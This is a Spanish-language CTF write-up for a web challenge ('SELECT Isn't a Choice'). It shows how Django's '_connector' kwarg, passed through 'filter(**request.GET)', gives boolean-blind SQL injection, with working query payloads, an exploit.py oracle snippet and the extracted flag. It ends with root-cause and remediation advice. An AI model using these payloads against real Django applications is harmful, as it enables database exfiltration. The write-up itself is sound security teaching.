# Write-up — SELECT Isn't a Choice

| | |
|---|---|
| **CTF** | FluidAttacks CTF 2026 |
| **Categoría** | web |
| **Dificultad** | Medium |
| **Puntos** | 270 |
| **Flag** | `flag{d0cf77c6fdba998e}` |
| **Vulnerabilidad** | Django ORM injection → **CVE-2025-64459** (SQLi vía el kwarg `_connector`) |

---

## 1. Enunciado

> SurveyHub lets you browse the company's internal surveys. A junior developer just
> shipped a search feature that filters by any field you put in the URL. **Any field.**

Instancia: `https://62c870af01a06c88.chal.ctf.ae`

Adjunto: `public.zip` (pass `infected`) → `models.py`, `views.py`, `urls.py`,
`requirements.txt`.

El código es escueto y va al grano:

```python
# views.py
@require_GET
def survey_search(request):
    filters = request.GET.dict()
    if not filters:
        surveys = Survey.objects.filter(is_public=True)
    else:
        try:
            surveys = Survey.objects.filter(**filters)   # ← GET expandido sin validar
        except Exception:
            return JsonResponse({"error": "Invalid filter parameters"}, status=400)
    results = [{ "id": s.id, "title": s.title, "category": s.category,
                 "author": s.author, "description": s.description }
               for s in surveys[:50]]
    return JsonResponse({"count": len(results), "results": results})
```

```python
# models.py
class Survey(models.Model):
    title, category, author, description, is_public, created_at

class AdminNote(models.Model):        # sin relación con Survey
    key = CharField(unique=True); value = TextField()
```

```
# requirements.txt
Django==5.1.13
```

El `Survey.objects.filter(**request.GET.dict())` es el patrón clásico de **Django ORM
injection**. La flag, evidentemente, está en `AdminNote`.

---

## 2. El callejón sin salida (ORM-leak clásico)

El primer instinto es el *ORM-leak / relational filtering* (la técnica "plORMbing" de
elttam): expandir GET a `filter()` permite **atravesar relaciones** (`author__user__
password__startswith=...`) y filtrar por campos de modelos relacionados, extrayendo
datos por oráculo booleano.

**Pero `AdminNote` no tiene ninguna relación con `Survey`.** Y sin relación, el ORM-leak
clásico no puede alcanzarlo — Django no genera ningún JOIN. Lo verifiqué a fondo:

- **Oráculo de existencia de campo:** `?<x>__isnull=True` devuelve **500** si `<x>` es un
  campo/relación válido (ValueError en evaluación, no capturado por el `try`) y **400** si
  no existe (FieldError capturado). Validé el oráculo (detecta una FK real como 500) y
  barrí **>2000 nombres** → solo existen los 7 campos de `Survey`. **Cero relaciones.**
- `?is_public=False` → 0; `?id__gte=0` → 12 (los mismos 12 surveys públicos en todas las
  instancias). No hay encuestas privadas ni flag en ningún campo de Survey.
- Un único endpoint (`/api/surveys/`), sin `/admin/`, sin columnas ocultas.

Conclusión intermedia: con el ORM-leak clásico, `AdminNote` es inalcanzable. Hacía falta
otra cosa. La pista definitiva: **`requirements.txt` fija `Django==5.1.13`**.

---

## 3. La vulnerabilidad real — CVE-2025-64459

Django 5.1.13 es vulnerable a **CVE-2025-64459** (parcheado en 5.1.14 / 5.2.8 / 4.2.26).

Cuando la app expande entrada no confiable en `filter()`/`Q()`, un atacante puede inyectar
el kwarg de control interno **`_connector`**. Internamente `Survey.objects.filter(**kwargs)`
construye `Q(**kwargs)`, y `Q.__init__(self, *args, _connector=None, _negated=False, **kwargs)`
acepta `_connector`. En la versión vulnerable ese valor **no se valida** contra `{AND,OR,XOR}`
y termina interpolándose **crudo** como el conector del `WHERE`:

```sql
SELECT ... FROM surveys_survey WHERE (cond1) <_connector> (cond2)
```

Es decir, **SQL injection** en la posición del conector. Comprobación:

```
?_connector=OR&title__icontains=zzz&category=Technology
   → (title LIKE '%zzz%') OR (category='Technology')   → count 3   (AND daría 0)

?_connector=GARBAGE&title__icontains=zzz&author__icontains=qqq
   → (…) GARBAGE (…)   → 500  (SQL inválido)

?_connector=OR 1=1 OR&title__icontains=zzz&author__icontains=qqq
   → (…) OR 1=1 OR (…)   → count 12  (¡todas las filas!)
```

El `_connector` se cuela literal en el SQL. Tengo control total de ese fragmento.

---

## 4. Explotación — boolean-blind SQLi

La flag está en `surveys_adminnote(key, value)` (nombre de tabla por defecto de Django:
`<app>_<model>`). Como el `SELECT` de columnas es fijo (no puedo UNIR columnas), uso un
**oráculo booleano**: dos condiciones falsas y una subconsulta en medio vía `_connector`.

```
?id=-1 & title__icontains=zznomatch & _connector=OR (<expr>) OR

WHERE (id = -1) OR (<expr>) OR (title LIKE '%zznomatch%')
   ≡ (false) OR (<expr>) OR (false)
   ≡ <expr>
```

- `<expr>` TRUE → devuelve las 12 filas (`count > 0`).
- `<expr>` FALSE → 0 filas.

Confirmación del canal: `(SELECT COUNT(*) FROM surveys_adminnote)>0` → TRUE.

Extracción del valor char a char con búsqueda binaria sobre el punto de código:

```
length((SELECT value FROM surveys_adminnote WHERE value LIKE 'flag{%'))  → 22
unicode(substr((SELECT value FROM surveys_adminnote WHERE value LIKE 'flag{%'), i, 1)) > N
```

### Script (`exploit.py`)

```python
def oracle(boolexpr):
    conn = f"OR ({boolexpr}) OR"
    r = S.get(API, params={"id":"-1","title__icontains":"zznomatchqq","_connector":conn})
    return r.status_code == 200 and r.json().get("count",0) > 0

SUB = "(SELECT value FROM surveys_adminnote WHERE value LIKE 'flag{%' LIMIT 1)"
# length + binary search por carácter con unicode(substr(SUB,i,1)) > N
```

```
$ python3 exploit.py https://62c870af01a06c88.chal.ctf.ae
[*] longitud = 22
[*] flag{d0cf77c6fdba998e}

>>> flag{d0cf77c6fdba998e}
```

---

## 5. Flag

```
flag{d0cf77c6fdba998e}
```

---

## 6. Causa raíz y remediación

**Causa raíz doble:**
1. **Mass-assignment de filtros:** `filter(**request.GET.dict())` expande entrada del
   usuario directamente en la construcción de la query, sin lista blanca de campos.
2. **CVE-2025-64459:** en Django < 5.1.14, los kwargs de control de `Q` (`_connector`,
   `_negated`) no estaban protegidos y el conector no se validaba, permitiendo SQLi.

**Cómo se arregla:**
- **Actualizar Django** a ≥ 5.1.14 / 5.2.8 / 4.2.26 (el parche rechaza `_connector`/
  `_negated` como kwargs y valida el conector contra `{AND, OR, XOR, None}`).
- **Nunca expandir `request.GET` en `filter()`**: validar contra una lista blanca de
  campos permitidos y construir los lookups explícitamente
  (`allowed = {"title__icontains", "category", "author__icontains"}`).
- Defensa en profundidad: separar los datos sensibles (la `AdminNote`) de la ruta de
  consulta pública.

**Lección de CTF:** cuando un reto Django *fija una versión concreta* en `requirements.txt`,
míralo — suele apuntar a un CVE. Aquí el título ("SELECT Isn't a Choice") y el modelo
`AdminNote` **sin relación** son la trampa: invitan al ORM-leak clásico, que no llega. La
solución real es la SQLi por `_connector` (CVE-2025-64459), que sí permite subconsultas
arbitrarias y, con un oráculo booleano, exfiltrar una tabla completamente inconexa.
